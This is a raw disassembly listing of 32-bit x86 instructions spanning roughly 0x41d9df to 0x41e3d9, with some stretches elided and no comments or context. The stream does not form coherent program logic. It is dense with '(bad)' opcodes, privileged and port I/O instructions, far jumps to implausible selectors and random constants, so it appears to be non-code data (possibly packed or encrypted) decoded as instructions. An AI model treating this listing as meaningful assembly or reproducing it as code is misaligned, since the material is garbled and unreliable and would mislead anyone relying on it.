  41d9df:	inc    ecx
  41d9e0:	cld    
  41d9e1:	push   ecx
  41d9e2:	imul   ebp,ecx,0xb38c8c05
  41d9e8:	mov    cl,0x90
  41d9ea:	mov    ds:0xb91746a1,al
  41d9ef:	stos   BYTE PTR es:[edi],al
  41d9f0:	mov    ecx,0x969bbe76
  41d9f5:	cmc    
  41d9f6:	adc    eax,0xc7dfb08d
  41d9fb:	jnp    0x41d9e2
  41d9fd:	mov    bl,0x4f
  41d9ff:	jne    0x41d9c2
  41da01:	popa   
  41da02:	lds    edi,FWORD PTR [edx]
  41da04:	mov    ebx,0xe0e50e0
  41da09:	mov    edx,0x4bba7a3e
  41da0e:	push   edi
  41da0f:	push   ax
  41da11:	inc    edi
  41da12:	sbb    bh,BYTE PTR [ecx]
  41da14:	and    bh,BYTE PTR [ebp-0x2e]
  41da17:	bound  ebp,QWORD PTR [ebp+ecx*8+0x136ecadb]
  41da1e:	pop    ebx
  41da1f:	or     ecx,ebx
  41da21:	arpl   WORD PTR [ecx+0xc],ax
  41da24:	rol    BYTE PTR [edx],0x57
  41da27:	jb     0x41d9f1
  41da29:	sbb    BYTE PTR [ecx-0x67],dl
  41da2c:	add    edi,DWORD PTR [edi+0x2a18ae87]
  41da32:	mov    ebx,DWORD PTR [ebp+0x1b]
	...
  41da94:	add    BYTE PTR [eax],al
  41da96:	sbb    al,0x15
  41da98:	jnp    0x41daed
  41da9a:	jnp    0x41db1b
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	jp     0x41daff
  41daa4:	icebp  
  41daa5:	pop    eax
  41daa6:	lds    edi,FWORD PTR [ecx]
  41daa8:	add    DWORD PTR [eax],eax
  41daaa:	pop    es
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [ecx+esi*1],bh
  41dab0:	sub    cl,ah
  41dab2:	adc    al,0xd9
  41dab4:	push   esi
  41dab5:	push   0x3a
  41dab7:	jecxz  0x41da66
  41dab9:	pop    ds
  41daba:	push   es
  41dabb:	jae    0x41dad7
  41dabd:	inc    ebx
  41dabe:	jecxz  0x41dab0
  41dac0:	push   es
  41dac1:	jne    0x41da84
  41dac3:	sbb    ax,0x1d4
  41dac7:	jp     0x41da9c
  41dac9:	and    DWORD PTR [esp+ebp*1],0x48
  41dacd:	inc    esi
  41dace:	push   ss
  41dacf:	scas   al,BYTE PTR es:[edi]
  41dad0:	and    eax,0x1ab88a4a
  41dad5:	aad    0xb8
  41dad7:	xchg   ebp,eax
  41dad8:	aas    
  41dad9:	clc    
  41dada:	sub    BYTE PTR [ebx-0x5884edcc],dh
  41dae0:	cmp    bh,BYTE PTR [ebx+0x43ceeec8]
  41dae6:	mov    ah,0x87
  41dae8:	cmc    
  41dae9:	sbb    edx,esp
  41daeb:	xchg   BYTE PTR [esi-0x2d64cbd7],al
  41daf1:	call   0x69cbe856
  41daf6:	loope  0x41daf6
  41daf8:	dec    edi
  41daf9:	fadd   QWORD PTR [edx-0x22]
  41dafc:	add    DWORD PTR [edx+0x18],edi
  41daff:	es push 0xecd0ee10
  41db05:	push   edx
  41db06:	add    BYTE PTR [ebx],al
  41db08:	hlt    
  41db09:	push   eax
  41db0a:	pop    edx
  41db0b:	push   ecx
  41db0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0d:	mov    cl,0x1a
  41db0f:	or     DWORD PTR [edi],0x6be59efc
  41db15:	ja     0x41daab
  41db17:	push   edx
  41db18:	cs xchg ebx,eax
  41db1a:	cmc    
  41db1b:	mov    ds:0x5c439a03,al
  41db20:	fst    st(5)
  41db22:	dec    edx
  41db23:	xor    BYTE PTR [ecx],0x46
  41db26:	or     ebp,esp
  41db28:	push   ds
  41db29:	mov    ebx,0x780bc618
  41db2e:	xor    al,0x7a
  41db30:	mov    ebp,0x33888766
  41db35:	mov    esp,0xd66b1bea
  41db3a:	and    ch,BYTE PTR [esi+0xeefa36e]
  41db40:	sti    
  41db41:	xlat   BYTE PTR ds:[ebx]
  41db42:	aad    0x97
  41db44:	add    DWORD PTR [edi],0x8e0097e0
  41db4a:	inc    ecx
  41db4b:	mov    ebx,DWORD PTR [ebx-0x53]
  41db4e:	bound  ebx,QWORD PTR [ebx]
  41db50:	dec    ecx
  41db51:	and    dl,0x18
  41db54:	imul   ebp,esi,0x3ff117d
  41db5a:	inc    eax
  41db5b:	shl    BYTE PTR ds:0x1a1ac179,0x3c
  41db62:	sbb    al,dh
  41db64:	stc    
  41db65:	jle    0x41dba1
  41db67:	or     eax,0x54100bd0
  41db6c:	mov    BYTE PTR [ecx],bh
  41db6e:	pop    esp
  41db6f:	nop
  41db70:	retf   0xced5
  41db73:	add    eax,0xcce16798
  41db78:	(bad)  
  41db7a:	add    esp,DWORD PTR ds:0xcad9d06c
  41db80:	mov    ?,WORD PTR [ebp+0x550bbea3]
  41db86:	mov    ch,0x6a
  41db88:	and    eax,DWORD PTR [ebp-0x10]
  41db8b:	loope  0x41db11
  41db8d:	in     al,dx
  41db8e:	div    BYTE PTR [ecx]
  41db90:	fimul  DWORD PTR [esi+0x60c8dc71]
  41db96:	inc    edx
  41db97:	cmp    BYTE PTR [esi-0x4218a29f],dh
  41db9d:	(bad)  
  41db9e:	addr16 gs mov bl,0xa
  41dba2:	fcom   DWORD PTR [edx+0x44142350]
  41dba8:	mov    ecx,0x4e1a6094
  41dbad:	inc    ebx
  41dbae:	xor    al,0x32
  41dbb0:	scas   al,BYTE PTR es:[edi]
  41dbb1:	sbb    eax,ecx
  41dbb3:	cmp    ebx,DWORD PTR [eax+0x0]
	...
  41dc16:	outs   dx,DWORD PTR ds:[esi]
  41dc17:	retf   0x9815
  41dc1a:	mov    ch,0xdf
  41dc1c:	out    dx,eax
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	cmp    eax,0xcc00c6b9
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    cl,al
  41dc2f:	pop    esp
  41dc30:	sahf   
  41dc31:	les    esp,FWORD PTR [edx+0x3c]
  41dc34:	test   DWORD PTR [esi+0xa],ecx
  41dc37:	loopne 0x41dc0e
  41dc39:	adc    eax,0xc43fd89d
  41dc3e:	cmp    ah,BYTE PTR [ebx-0x68]
  41dc41:	dec    esp
  41dc42:	adc    bl,0xbd
  41dc45:	pop    edx
  41dc46:	std    
  41dc47:	cmp    eax,0x45fa6df2
  41dc4c:	jnp    0x41dcca
  41dc4e:	mov    ecx,0xe40bdadf
  41dc53:	xor    eax,0x9da95f51
  41dc58:	inc    ebp
  41dc5a:	pop    edi
  41dc5b:	lods   al,BYTE PTR ds:[esi]
  41dc5c:	ret    0xd67b
  41dc5f:	push   esp
  41dc60:	jmp    0x421b:0xad0eb59a
  41dc67:	lds    edi,FWORD PTR [eax-0x3db13a4a]
  41dc6d:	mov    al,0x4a
  41dc6f:	sub    eax,0x4ed0db5d
  41dc74:	cmp    al,cl
  41dc76:	mov    eax,ds:0xd2c664ab
  41dc7b:	inc    esp
  41dc7c:	cmp    eax,0x9ebe1d9
  41dc81:	and    al,0xe8
  41dc83:	jecxz  0x41dcc5
  41dc85:	xchg   edx,eax
  41dc86:	(bad)  
  41dc87:	or     al,0x6c
  41dc89:	test   BYTE PTR [esi-0x6b],bl
  41dc8c:	push   es
  41dc8d:	mov    bl,0x8e
  41dc8f:	fwait
  41dc90:	xchg   ebx,eax
  41dc91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc92:	pop    es
  41dc93:	or     ah,BYTE PTR [ebx-0x72]
  41dc96:	fistp  WORD PTR [ecx-0x31cfaeab]
  41dc9c:	ins    DWORD PTR es:[edi],dx
  41dc9d:	les    ebx,FWORD PTR [ebx+0x6b3cfa07]
  41dca3:	inc    esp
  41dca4:	push   ecx
  41dca5:	fisttp WORD PTR [eax]
  41dca7:	(bad)  
  41dca9:	or     BYTE PTR [ebx+0x3e7f3c3d],cl
  41dcaf:	pop    ecx
  41dcb0:	jge    0x41dc91
  41dcb2:	pusha  
  41dcb3:	inc    ecx
  41dcb4:	adc    al,0x7d
  41dcb6:	xor    eax,ecx
  41dcb8:	xor    ebx,DWORD PTR [edi]
  41dcba:	or     DWORD PTR [ebx+0x778734ea],0x3930a45b
  41dcc4:	push   0xb6daff72
  41dcc9:	mov    ecx,0x31845809
  41dcce:	push   eax
  41dccf:	das    
  41dcd0:	sbb    al,0xb
  41dcd2:	sbb    ebx,ebx
  41dcd4:	and    edi,DWORD PTR [ebp+0x2ad8e923]
  41dcda:	leave  
  41dcdb:	jle    0x41dcfa
  41dcdd:	lods   ax,WORD PTR ds:[esi]
  41dcdf:	mov    ch,ah
  41dce1:	pop    esp
  41dce2:	mov    ecx,0xb5714171
  41dce7:	dec    edx
  41dce8:	xchg   edi,eax
  41dce9:	int3   
  41dcea:	ins    DWORD PTR es:[edi],dx
  41dceb:	dec    esi
  41dcec:	daa    
  41dced:	cwde   
  41dcee:	mov    esp,0xc0210cb0
  41dcf3:	fbstp  TBYTE PTR [ebx+edi*1-0x2a]
  41dcf7:	bswap  ebx
  41dcf9:	sbb    eax,eax
  41dcfb:	xor    al,0xd1
  41dcfd:	or     esp,DWORD PTR [esi]
  41dcff:	mov    edx,0x788d2cb7
  41dd04:	push   0x6b
  41dd06:	mov    eax,ds:0x21f6b097
  41dd0b:	sub    BYTE PTR gs:[ecx-0x6c],ah
  41dd0f:	das    
  41dd10:	sbb    edi,DWORD PTR [eax+edx*8]
  41dd13:	outs   dx,DWORD PTR ds:[esi]
  41dd14:	mov    ecx,0x2b8e05eb
  41dd1a:	jl     0x41dca5
  41dd1c:	sub    DWORD PTR [edi+0x7],ebx
  41dd1f:	jne    0x41dd3f
  41dd21:	imul   eax,ebx,0xffffffa1
  41dd24:	lea    ebx,[edi-0x497fced3]
  41dd2a:	arpl   WORD PTR [esp-0x1a7a5b3c],bp
  41dd31:	aad    0x46
  41dd33:	mov    ebx,0x97
	...
  41dd94:	add    BYTE PTR [eax],al
  41dd96:	and    bl,dh
  41dd98:	das    
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0x3d1667bb,eax
  41dda3:	xchg   ecx,eax
  41dda4:	pop    eax
  41dda5:	cdq    
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [edx*1-0x19ad4a40],al
  41ddb4:	loop   0x41dd75
  41ddb6:	into   
  41ddb7:	out    dx,eax
  41ddb8:	jmp    0x3d9:0x38095c80
  41ddbf:	jmp    0x362e62c9
  41ddc4:	leave  
  41ddc5:	jne    0x41dd4b
  41ddc7:	aad    0x4e
  41ddc9:	cmp    bl,BYTE PTR [edx]
  41ddcb:	mov    bh,BYTE PTR [eax+ecx*4+0x6a]
  41ddcf:	pushf  
  41ddd0:	nop
  41ddd1:	(bad)  
  41ddd3:	cmp    al,0xf6
  41ddd5:	cwde   
  41ddd6:	scas   eax,DWORD PTR es:[edi]
  41ddd7:	pop    esp
  41ddd8:	sub    eax,0x5de5f6d6
  41dddd:	out    dx,eax
  41ddde:	sti    
  41dddf:	pop    esp
  41dde0:	pop    ecx
  41dde1:	pop    es
  41dde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde3:	cmp    BYTE PTR [esi+0x6a],al
  41dde6:	sub    al,0xf2
  41dde8:	out    0xf0,eax
  41ddea:	retf   
  41ddeb:	cs sub ah,ah
  41ddee:	mov    bl,dh
  41ddf0:	sbb    al,0xf6
  41ddf2:	xor    DWORD PTR [esi+esi*2-0x66bca08a],eax
  41ddf9:	xlat   BYTE PTR ds:[ebx]
  41ddfa:	enter  0xf212,0x3
  41ddfe:	inc    ecx
  41ddff:	adc    bl,BYTE PTR [ebx]
  41de01:	xchg   DWORD PTR [eax+esi*4+0x52],ebx
  41de05:	mov    WORD PTR [ebx-0x44],ss
  41de08:	push   ebp
  41de09:	nop
  41de0a:	xor    dh,ch
  41de0c:	mov    BYTE PTR [esi-0x6c66664f],dl
  41de12:	nop
  41de13:	in     al,dx
  41de14:	jge    0x41de1a
  41de16:	in     al,0x4
  41de18:	call   0x568:0x74783a4e
  41de1f:	pop    esp
  41de20:	pop    es
  41de21:	sub    dl,BYTE PTR [ecx+eiz*4-0x3207c0a7]
  41de28:	and    al,0x29
  41de2a:	scas   al,BYTE PTR es:[edi]
  41de2b:	jb     0x41ddf6
  41de2d:	cmp    DWORD PTR [esi-0x9],ebx
  41de30:	mov    bh,0x9e
  41de32:	imul   edx,DWORD PTR [edx+eiz*2+0x23f0b79],0xd
  41de3a:	xor    dl,dh
  41de3c:	ret    
  41de3d:	inc    edi
  41de3e:	dec    esp
  41de3f:	add    ebp,0xffffffd2
  41de42:	push   0xd50c505e
  41de47:	inc    ebx
  41de48:	pop    es
  41de49:	out    dx,al
  41de4a:	inc    ebp
  41de4b:	repnz and al,0x4c
  41de4e:	xchg   BYTE PTR [ebx-0x1a4dca9],ah
  41de54:	in     al,0x95
  41de56:	sub    cl,BYTE PTR [edx-0x39913c2d]
  41de5c:	xchg   eax,ecx
  41de5e:	enter  0x874b,0x81
  41de62:	rol    DWORD PTR [ebp+0x585a9016],cl
  41de68:	or     BYTE PTR ds:0x4ffb3be6,dh
  41de6e:	sbb    BYTE PTR [ebx+0x5a],ah
  41de71:	les    esi,FWORD PTR [ecx+0x53]
  41de74:	lea    edi,[ecx-0x19]
  41de77:	push   ss
  41de78:	sbb    BYTE PTR [edi-0x18],0xab
  41de7c:	pop    edi
  41de7d:	sub    bl,BYTE PTR [esi-0x10f0017a]
  41de83:	jmp    0x9e39:0x79cb3c3b
  41de8a:	bound  eax,QWORD PTR [ebx]
  41de8c:	lods   al,BYTE PTR ds:[esi]
  41de8d:	mov    dl,BYTE PTR [edi+0x1e254825]
  41de93:	lock xchg ecx,eax
  41de95:	jno    0x41def0
  41de97:	outs   dx,BYTE PTR ds:[esi]
  41de98:	out    0xa5,eax
  41de9a:	mov    esp,0x17f1433d
  41de9f:	pop    esp
  41dea0:	jno    0x41ded5
  41dea2:	sbb    DWORD PTR [edi+ebp*8],eax
  41dea5:	sbb    dl,BYTE PTR [esi-0x3a]
  41dea8:	imul   eax,DWORD PTR [edx+0x7f6f20dc],0x2019a362
  41deb2:	pusha  
  41deb3:	xor    eax,0x72
	...
  41df14:	add    BYTE PTR [eax],al
  41df16:	aas    
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0x9230c191
  41df24:	nop
  41df25:	mov    bh,0xda
  41df27:	cmp    al,0x1
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    ch,bl
  41df2f:	mov    eax,0xbd450b05
  41df34:	push   cs
  41df35:	mov    esp,0xf0ea6173
  41df3a:	leave  
  41df3b:	inc    edx
  41df3c:	push   esi
  41df3d:	imul   esi,ebx,0x4f
  41df40:	sbb    DWORD PTR [edi+0x59041ca9],edi
  41df46:	push   ebx
  41df47:	sti    
  41df48:	inc    dx
  41df4a:	and    cl,BYTE PTR [eax-0x75]
  41df4d:	cmp    DWORD PTR [edi-0x5a],0x6ef62563
  41df54:	test   DWORD PTR [ebx],edx
  41df56:	pop    ecx
  41df57:	(bad)  
  41df58:	nop
  41df59:	mov    edx,0x969665da
  41df5e:	addr16 mov al,0x6f
  41df61:	cmp    BYTE PTR [eax+0x4823f532],ah
  41df67:	in     eax,dx
  41df68:	push   0xde258d7
  41df6d:	xchg   esp,eax
  41df6e:	xchg   edi,eax
  41df6f:	mov    ecx,0x4f66322b
  41df74:	scas   al,BYTE PTR es:[edi]
  41df75:	and    al,0xa3
  41df77:	or     BYTE PTR [ecx+0x36],0xc2
  41df7b:	add    dh,bh
  41df7d:	out    0x88,al
  41df7f:	js     0x41dfad
  41df81:	je     0x41df7a
  41df83:	jbe    0x41df7e
  41df85:	fisubr DWORD PTR [ebp+eax*8-0x2c]
  41df89:	cld    
  41df8a:	and    dl,BYTE PTR [ecx-0x4c]
  41df8d:	inc    edx
  41df8e:	loope  0x41dfcb
  41df90:	jg     0x41dfdf
  41df92:	adc    eax,0xc112e876
  41df97:	jbe    0x41df50
  41df99:	mov    dl,0x7e
  41df9b:	fisubr DWORD PTR [edx-0x11200cc0]
  41dfa1:	push   cs
  41dfa2:	mov    eax,0xd000bab8
  41dfa7:	icebp  
  41dfa8:	xor    DWORD PTR [ebp+0x6a],edi
  41dfab:	add    BYTE PTR [eax-0x4f],bl
  41dfae:	add    esi,DWORD PTR [ebx]
  41dfb0:	dec    ebx
  41dfb1:	fidiv  DWORD PTR [esi-0x2c1defb7]
  41dfb7:	in     al,0x5d
  41dfb9:	mov    al,0xe2
  41dfbb:	fistp  WORD PTR [ebx-0x69]
  41dfbe:	nop
  41dfbf:	xchg   edx,eax
  41dfc0:	push   esi
  41dfc1:	mov    al,ds:0xee621b34
  41dfc6:	add    edi,DWORD PTR [edi-0x36]
  41dfc9:	xchg   esi,eax
  41dfca:	xor    ecx,DWORD PTR [eax-0x4a]
  41dfcd:	test   BYTE PTR [ecx+0x1f12e5ee],bl
  41dfd3:	stos   DWORD PTR es:[edi],eax
  41dfd4:	dec    eax
  41dfd5:	push   edi
  41dfd6:	cdq    
  41dfd7:	(bad)  
  41dfd8:	push   ds
  41dfd9:	adc    DWORD PTR [ebx],0xffffff84
  41dfdc:	test   bh,bh
  41dfde:	push   eax
  41dfdf:	push   cs
  41dfe0:	ficomp WORD PTR [edx-0x5c039d09]
  41dfe6:	add    al,0x88
  41dfe8:	shr    DWORD PTR [ebp-0x1e8677c],1
  41dfee:	les    esp,FWORD PTR [ebp+0x1]
  41dff1:	fsub   st(3),st
  41dff3:	sub    al,0xe9
  41dff5:	int3   
  41dff6:	lods   al,BYTE PTR ds:[esi]
  41dff7:	(bad)  
  41dff8:	xchg   ecx,eax
  41dff9:	ror    ah,cl
  41dffb:	xor    ebp,DWORD PTR [ebx+eiz*4-0x701b4061]
  41e002:	jmp    DWORD PTR [esi]
  41e004:	stos   BYTE PTR es:[edi],al
  41e005:	cmp    dl,dl
  41e007:	and    ch,ch
  41e009:	arpl   WORD PTR [edx+0x33b8afbd],cx
  41e00f:	inc    ebp
  41e010:	popf   
  41e011:	cdq    
  41e012:	pop    esi
  41e013:	sti    
  41e014:	or     cl,BYTE PTR [eax+0x6ee79fc]
  41e01a:	cmp    al,0x89
  41e01c:	or     DWORD PTR [eax],0x482a5f80
  41e022:	jecxz  0x41e018
  41e024:	push   ss
  41e025:	outs   dx,DWORD PTR ds:[esi]
  41e026:	(bad)  
  41e027:	mov    bl,0xa5
  41e029:	or     esi,DWORD PTR [esp+eax*1]
  41e02c:	jno    0x41dfc0
  41e02e:	or     eax,DWORD PTR [edi-0x5f33ff4]
  41e034:	dec    eax
	...
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0a3:	pop    ds
  41e0a4:	jecxz  0x41e051
  41e0a6:	loope  0x41e0e5
  41e0a8:	add    DWORD PTR [eax],eax
  41e0aa:	pop    es
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    bl,al
  41e0af:	aad    0x14
  41e0b1:	frstor [edx+0x16]
  41e0b4:	jle    0x41e113
  41e0b6:	dec    ebp
  41e0b7:	jnp    0x41e0f9
  41e0b9:	xchg   ebx,eax
  41e0ba:	sbb    bh,BYTE PTR [esi-0x39ad50fe]
  41e0c0:	repnz dec eax
  41e0c2:	shl    BYTE PTR [ecx],cl
  41e0c4:	dec    ebp
  41e0c5:	mov    ebp,0x7b393a84
  41e0ca:	sub    esp,esi
  41e0cc:	daa    
  41e0cd:	adc    esp,DWORD PTR ds:0x507d6764
  41e0d3:	test   BYTE PTR [ebx],ch
  41e0d5:	leave  
  41e0d6:	push   ecx
  41e0d7:	scas   al,BYTE PTR es:[edi]
  41e0d8:	xor    BYTE PTR [esp+edi*2+0x4a],bh
  41e0dc:	dec    edi
  41e0dd:	mov    BYTE PTR [ebx-0x14b643ef],0x87
  41e0e4:	jno    0x41e0f6
  41e0e6:	stos   BYTE PTR es:[edi],al
  41e0e7:	or     edx,edx
  41e0e9:	mov    ebp,0xc195fe79
  41e0ee:	adc    eax,0xa405941d
  41e0f3:	lods   eax,DWORD PTR ds:[esi]
  41e0f4:	dec    ebp
  41e0f5:	callw  0xf5af
  41e0f9:	mov    ecx,0x70cebd2c
  41e0fe:	sbb    edi,ebx
  41e100:	pop    es
  41e101:	nop
  41e102:	ret    
  41e103:	dec    eax
  41e104:	push   cs
  41e105:	dec    esp
  41e106:	add    DWORD PTR fs:[edi+eax*8+0x1ac85432],ebp
  41e10e:	repnz xor esp,DWORD PTR [ebx+0xd581293]
  41e115:	pop    esp
  41e116:	jne    0x41e156
  41e118:	pushf  
  41e119:	jmp    0x41e0cf
  41e11b:	add    ebp,DWORD PTR [ebx+0x4543fc27]
  41e121:	popa   
  41e122:	in     al,dx
  41e123:	in     eax,0x62
  41e125:	and    BYTE PTR [eax+ebp*8],bl
  41e128:	add    BYTE PTR [eax],0x8d
  41e12b:	mov    cl,0x36
  41e12d:	sub    dh,BYTE PTR [esi-0x1d]
  41e130:	sub    edx,0x7f
  41e133:	adc    DWORD PTR [edi-0x8],0x5dbd2fcf
  41e13a:	mov    WORD PTR [ebx],fs
  41e13c:	cwde   
  41e13d:	xchg   BYTE PTR [ebx+0x2f1319d6],bh
  41e143:	cwde   
  41e144:	ins    DWORD PTR es:[edi],dx
  41e145:	add    DWORD PTR [esi+ebx*8-0x77],ebx
  41e149:	or     al,0x22
  41e14b:	adc    al,0xc2
  41e14d:	int3   
  41e14e:	mov    cl,0x2f
  41e150:	call   0x7d0a7ff8
  41e155:	das    
  41e156:	(bad)  
  41e157:	fsub   QWORD PTR [ecx-0xfae75c7]
  41e15d:	ins    DWORD PTR es:[edi],dx
  41e15e:	mov    ecx,0xc06af686
  41e163:	fstp   TBYTE PTR [edi+0x9a11ab7]
  41e169:	and    dh,BYTE PTR [eax-0x38]
  41e16c:	in     al,0x6b
  41e16e:	inc    edi
  41e16f:	stos   BYTE PTR es:[edi],al
  41e170:	popa   
  41e171:	inc    eax
  41e172:	es and al,0x41
  41e175:	cmp    BYTE PTR [ecx-0x16],0x19
  41e179:	adc    bh,dl
  41e17b:	push   0xd91ad7bf
  41e180:	mov    bh,0x81
  41e182:	jmp    0x41e174
  41e184:	jae    0x41e1f5
  41e186:	push   esi
  41e187:	pop    esi
  41e188:	cli    
  41e189:	inc    esi
  41e18b:	pop    edx
  41e18c:	sar    BYTE PTR [edi+0x62b87219],cl
  41e192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e193:	sti    
  41e194:	movq   QWORD PTR [ecx+0x51fb3478],mm4
  41e19b:	icebp  
  41e19c:	add    al,0x3d
  41e19e:	xchg   edx,eax
  41e19f:	and    al,0x74
  41e1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1a2:	jb     0x41e146
  41e1a4:	mov    ah,BYTE PTR [ecx]
  41e1a6:	les    eax,FWORD PTR [edi]
  41e1a8:	enter  0xa981,0x87
  41e1ac:	test   edi,ebx
  41e1ae:	and    eax,0x24d73709
  41e1b3:	xchg   ebx,eax
  41e1b4:	jae    0x41e1b6
	...
  41e216:	stos   DWORD PTR es:[edi],eax
  41e217:	add    dh,BYTE PTR [edi-0x1a]
  41e21a:	push   edi
  41e21c:	mov    ebx,0xf08a4a4f
  41e221:	mov    eax,DWORD PTR [ecx+edi*1]
  41e224:	jl     0x41e205
  41e226:	call   0x741e369
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edi],dl
  41e22f:	mov    eax,0x4c219e8a
  41e234:	stos   BYTE PTR es:[edi],al
  41e235:	clc    
  41e236:	pusha  
  41e237:	xchg   edi,eax
  41e238:	mov    esi,0xc619d5da
  41e23d:	nop
  41e23e:	or     cl,dh
  41e240:	sub    al,0xe4
  41e242:	int3   
  41e243:	jae    0x41e234
  41e245:	pop    esi
  41e246:	mov    ds:0xcfe4d288,al
  41e24b:	mov    esi,0x5ac37c5a
  41e250:	mov    dl,0x29
  41e252:	inc    esi
  41e253:	mov    cl,0xf4
  41e255:	retf   0xad08
  41e258:	cs push es
  41e25a:	les    edi,FWORD PTR [edi+0x37]
  41e25d:	push   edi
  41e25e:	jo     0x41e283
  41e260:	xor    DWORD PTR [edx+edi*2-0x2],esi
  41e264:	push   esp
  41e265:	(bad)
  41e268:	shr    DWORD PTR [ebx-0x62],cl
  41e26b:	repz pop edx
  41e26d:	jnp    0x41e27d
  41e26f:	mov    al,ds:0xff9336d5
  41e274:	sub    edx,0xffffffaa
  41e277:	fcomp  st(1)
  41e279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e27a:	sub    al,0xc6
  41e27c:	and    bh,BYTE PTR fs:[ebp+ecx*8-0x40]
  41e281:	mov    eax,ds:0x40723afc
  41e286:	mov    dl,0x7f
  41e288:	mov    ds,WORD PTR [ebp-0x279a277c]
  41e28e:	push   cs
  41e28f:	xor    edx,eax
  41e291:	stos   DWORD PTR es:[edi],eax
  41e292:	in     eax,dx
  41e293:	fadd   QWORD PTR [esi]
  41e295:	sbb    eax,0x785397a5
  41e29a:	je     0x41e263
  41e29c:	outs   dx,DWORD PTR ds:[esi]
  41e29d:	aas    
  41e29e:	sbb    edx,DWORD PTR [esi]
  41e2a0:	and    esp,ebx
  41e2a2:	sub    esp,DWORD PTR [edi+eax*8+0x25]
  41e2a6:	or     ebp,ecx
  41e2a8:	fwait
  41e2a9:	int3   
  41e2aa:	and    eax,0xcdc82877
  41e2af:	pop    ds
  41e2b0:	fmul   st(5),st
  41e2b2:	mov    ?,WORD PTR [edx]
  41e2b4:	adc    esp,ecx
  41e2b6:	sub    BYTE PTR [esi+0x50],bh
  41e2b9:	in     eax,dx
  41e2ba:	(bad)  
  41e2bb:	xchg   esp,eax
  41e2bc:	pop    ebp
  41e2bd:	add    al,0x2d
  41e2bf:	push   0x77
  41e2c1:	xor    al,0x6a
  41e2c3:	cmp    DWORD PTR [ebx+0x246889b4],0x36d2632d
  41e2cd:	icebp  
  41e2ce:	sar    DWORD PTR [esi],0x37
  41e2d1:	invd   
  41e2d3:	jnp    0x41e32e
  41e2d5:	push   0x1147d6e0
  41e2da:	mov    ch,0x4e
  41e2dc:	add    DWORD PTR [edi-0x7e804c65],ebp
  41e2e2:	out    dx,eax
  41e2e3:	daa    
  41e2e4:	lahf   
  41e2e5:	cmc    
  41e2e6:	jnp    0x41e329
  41e2e8:	imul   edi,DWORD PTR [ebp+0x5fcd8984],0x76f7a558
  41e2f2:	addr16 cwde 
  41e2f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2f5:	pushf  
  41e2f6:	xchg   edx,eax
  41e2f7:	push   edi
  41e2f8:	xchg   esi,eax
  41e2f9:	daa    
  41e2fa:	xchg   esp,eax
  41e2fb:	xor    DWORD PTR [ecx+0x46d265ec],edx
  41e301:	mov    edi,DWORD PTR [ecx]
  41e303:	in     eax,0x7c
  41e305:	dec    ebx
  41e306:	dec    esp
  41e307:	cmp    BYTE PTR [edi],ah
  41e309:	dec    eax
  41e30a:	cmc    
  41e30b:	test   eax,0xe31b7d87
  41e310:	mov    bh,0x5e
  41e312:	jle    0x41e384
  41e314:	sbb    DWORD PTR [edx-0x27],esi
  41e317:	jecxz  0x41e393
  41e319:	push   cs
  41e31a:	ret    0x79ea
  41e31d:	and    ebp,esi
  41e31f:	xor    ebx,DWORD PTR [eax-0xaebd232]
  41e325:	outs   dx,BYTE PTR ds:[esi]
  41e326:	icebp  
  41e327:	test   al,0xad
  41e329:	lahf   
  41e32a:	xchg   esi,eax
  41e32b:	sbb    cl,BYTE PTR [ecx-0x76e97c6c]
  41e331:	mov    ds:0xb623cc,eax
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0x8f204855
  41e3a3:	xchg   ecx,eax
  41e3a4:	fucomi st,st(5)
  41e3a6:	out    dx,eax
  41e3a7:	aas    
  41e3a8:	add    DWORD PTR [eax],eax
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    BYTE PTR [esi],bl
  41e3af:	mov    esi,0x6a8b5d64
  41e3b4:	jmp    0x41e393
  41e3b6:	dec    ecx
  41e3b7:	imul   edi,DWORD PTR [ebx+0x53],0x67
  41e3bb:	stc    
  41e3bc:	dec    edx
  41e3bd:	mov    eax,0x96698017
  41e3c2:	sbb    DWORD PTR [ebx],esp
  41e3c4:	imul   DWORD PTR [edx-0x79]
  41e3c7:	inc    edi
  41e3c8:	mov    dl,0xb
  41e3ca:	xchg   esp,eax
  41e3cb:	dec    edi
  41e3cc:	adc    esi,ebp
  41e3ce:	icebp  
  41e3cf:	popa   
  41e3d0:	dec    ebp
  41e3d1:	push   ss
  41e3d2:	call   0x22d6:0x8f104f85
  41e3d9:	lods   al,BYTE PTR ds:[esi]
